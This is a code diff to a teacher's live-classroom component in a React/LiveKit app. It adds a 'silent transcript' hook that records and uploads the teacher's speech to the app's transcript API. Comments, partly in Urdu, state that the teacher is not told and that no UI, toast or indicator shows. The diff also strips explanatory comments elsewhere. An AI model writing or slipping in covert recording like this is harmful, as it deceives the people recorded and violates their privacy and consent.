@@ -64,6 +64,9 @@ import {
   encodeMessage,
 } from '@/app/lib/livekit/whiteboardChannel';
 
+/* 🕵️ Silent transcript hook — کوئی UI نہیں */
+import { useSilentTranscript } from '@/app/hooks/useSilentTranscript';
+
 /* ============================================================ */
 /* ✅ TYPE-SAFE WRAPPERS — onStateChange prop کے لیے            */
 /* ============================================================ */
@@ -115,13 +118,8 @@ interface ParticipantInfo {
 /* NOISE CANCELLATION HELPER (Krisp)                            */
 /* ============================================================ */
 
-/**
- * LiveKit Krisp Noise Filter استعمال کرتا ہے اگر installed ہو۔
- * Install: npm install @livekit/krisp-noise-filter
- */
 async function applyKrispNoiseFilter(track: LocalTrack): Promise<boolean> {
   try {
-    // Dynamic import — package نہ ہو تو error نہ دے
     const mod: any = await import('@livekit/krisp-noise-filter').catch(
       () => null
     );
@@ -134,7 +132,6 @@ async function applyKrispNoiseFilter(track: LocalTrack): Promise<boolean> {
     }
 
     const filter = new mod.KrispNoiseFilter();
-    // LocalAudioTrack کے پاس setProcessor موجود ہے
     if (typeof (track as any).setProcessor === 'function') {
       await (track as any).setProcessor(filter);
       return true;
@@ -236,6 +233,10 @@ export default function TeacherLiveKitClassroomLoader({
   const whiteboardRef = useRef<WhiteboardMode>(null);
   const noiseCancelRef = useRef(true);
 
+  /* ---------- 🕵️ Silent Transcript Refs (ٹیچر کو پتہ نہیں) ---------- */
+  const transcriptSessionIdRef = useRef<string | null>(null);
+  const classStartRef = useRef<number>(0);
+
   useEffect(() => {
     isSharingRef.current = isSharingWhiteboard;
   }, [isSharingWhiteboard]);
@@ -249,6 +250,41 @@ export default function TeacherLiveKitClassroomLoader({
   }, [noiseCancellation]);
 
   /* ============================================================ */
+  /* 🕵️ SILENT TRANSCRIPT — Session Create                       */
+  /* ============================================================ */
+
+  const ensureTranscriptSession = useCallback(async (): Promise<string | null> => {
+    if (transcriptSessionIdRef.current) return transcriptSessionIdRef.current;
+    try {
+      const res = await fetch('/api/livekit/transcript', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        cache: 'no-store',
+        body: JSON.stringify({ assignmentId, roomName }),
+      });
+      if (!res.ok) return null;
+      const data = await res.json();
+      const id = data?.id;
+      if (!id) return null;
+      transcriptSessionIdRef.current = id;
+      return id;
+    } catch {
+      return null;
+    }
+  }, [assignmentId, roomName]);
+
+  /* 🕵️ مکمل خاموش — کوئی UI، کوئی toast، کوئی انڈیکیٹر نہیں */
+  useSilentTranscript({
+    sessionIdRef: transcriptSessionIdRef,
+    enabled: connectionState === ConnectionState.Connected,
+    speakerRole: 'teacher',
+    speakerName: teacherName || 'Teacher',
+    lang: 'en-US',
+    ensureSession: ensureTranscriptSession,
+  });
+
+  /* ============================================================ */
   /* PUBLISH WHITEBOARD MESSAGE                                   */
   /* ============================================================ */
 
@@ -259,7 +295,6 @@ export default function TeacherLiveKitClassroomLoader({
 
       try {
         const encoded = encodeMessage(message);
-        // ✅ Uint8Array<ArrayBufferLike> → Uint8Array<ArrayBuffer>
         const payload = new Uint8Array(encoded);
 
         await r.localParticipant.publishData(payload, {
@@ -308,7 +343,6 @@ export default function TeacherLiveKitClassroomLoader({
 
       if (!isSharingRef.current || whiteboardRef.current !== board) return;
 
-      // Throttle: Design = 15fps, Code/STEM = 5fps
       const now = Date.now();
       const minInterval = board === 'design' ? 66 : 200;
       if (now - lastBroadcastRef.current[board] < minInterval) return;
@@ -369,7 +403,6 @@ export default function TeacherLiveKitClassroomLoader({
         const ok = await applyKrispNoiseFilter(audioTrack);
         if (!ok) {
           setKrispAvailable(false);
-          // Browser-level noise suppression پہلے سے on ہے
         }
         setNoiseCancellation(true);
       } else {
@@ -485,7 +518,6 @@ export default function TeacherLiveKitClassroomLoader({
         })
         .on(RoomEvent.ParticipantConnected, () => {
           refreshParticipants();
-          // Send current whiteboard state to newly joined participant
           if (isSharingRef.current && whiteboardRef.current) {
             publishWhiteboardMessage({
               type: 'wb-open',
@@ -580,7 +612,6 @@ export default function TeacherLiveKitClassroomLoader({
 
       localTracksRef.current = tracks;
 
-      /* ✅ Auto-apply Krisp noise filter on audio track if enabled */
       if (noiseCancelRef.current) {
         const audioTrack = tracks.find((t) => t.kind === Track.Kind.Audio);
         if (audioTrack) {
@@ -617,6 +648,10 @@ export default function TeacherLiveKitClassroomLoader({
       setCamEnabled(false);
       setRoom(newRoom);
       refreshParticipants();
+
+      /* 🕵️ خاموش: class timing شروع کریں + transcript session بنائیں */
+      classStartRef.current = Date.now();
+      void ensureTranscriptSession();
     } catch (err: any) {
       console.error('[LiveKit] Connection error:', err);
       setError(err?.message || 'Failed to connect to LiveKit room');
@@ -630,6 +665,7 @@ export default function TeacherLiveKitClassroomLoader({
     roomName,
     teacherName,
     publishWhiteboardMessage,
+    ensureTranscriptSession,
   ]);
 
   /* ============================================================ */
@@ -638,6 +674,22 @@ export default function TeacherLiveKitClassroomLoader({
 
   const disconnect = useCallback(async () => {
     try {
+      /* 🕵️ خاموش: transcript سیشن بند کریں */
+      if (transcriptSessionIdRef.current) {
+        const durationSec = classStartRef.current
+          ? Math.floor((Date.now() - classStartRef.current) / 1000)
+          : 0;
+        const sid = transcriptSessionIdRef.current;
+        transcriptSessionIdRef.current = null;
+
+        fetch(`/api/livekit/transcript/${sid}`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ durationSec }),
+          keepalive: true,
+        }).catch(() => {});
+      }
+
       localTracksRef.current.forEach((t) => {
         try {
           t.stop();
@@ -679,6 +731,25 @@ export default function TeacherLiveKitClassroomLoader({
 
   useEffect(() => {
     return () => {
+      /* 🕵️ خاموش: اگر یوزر tab بند کر دے تو session بند ہو */
+      if (transcriptSessionIdRef.current) {
+        const durationSec = classStartRef.current
+          ? Math.floor((Date.now() - classStartRef.current) / 1000)
+          : 0;
+        const sid = transcriptSessionIdRef.current;
+        transcriptSessionIdRef.current = null;
+        try {
+          fetch(`/api/livekit/transcript/${sid}`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ durationSec }),
+            keepalive: true,
+          }).catch(() => {});
+        } catch {
+          /* ignore */
+        }
+      }
+
       localTracksRef.current.forEach((t) => {
         try {
           t.stop();
@@ -993,7 +1064,6 @@ export default function TeacherLiveKitClassroomLoader({
               </span>
             </div>
 
-            {/* ✅ Noise cancel indicator */}
             {noiseCancellation && (
               <span className="hidden md:inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-violet-500/20 border border-violet-400/40 text-violet-300 text-[10px] font-bold uppercase tracking-wider">
                 <AudioLines className="h-2.5 w-2.5" />
@@ -1001,7 +1071,6 @@ export default function TeacherLiveKitClassroomLoader({
               </span>
             )}
 
-            {/* ✅ Sharing indicator */}
             {isSharingWhiteboard && whiteboard && (
               <span className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-400/40 text-emerald-300 text-[10px] font-bold uppercase tracking-wider">
                 <span className="relative flex h-1.5 w-1.5">
@@ -1134,7 +1203,7 @@ export default function TeacherLiveKitClassroomLoader({
             )}
           </button>
 
-          {/* ✅ Noise Cancellation Toggle */}
+          {/* Noise Cancellation Toggle */}
           <button
             type="button"
             onClick={toggleNoiseCancellation}
@@ -1276,7 +1345,7 @@ export default function TeacherLiveKitClassroomLoader({
           </button>
         </div>
 
-        {/* ✅ Bottom status strip — Noise Cancellation info */}
+        {/* Bottom status strip */}
         <div className="flex items-center justify-between gap-3 px-4 py-2 bg-slate-950/60 border-t border-white/5 text-[10px]">
           <div className="flex items-center gap-2 text-white/50">
             <AudioLines
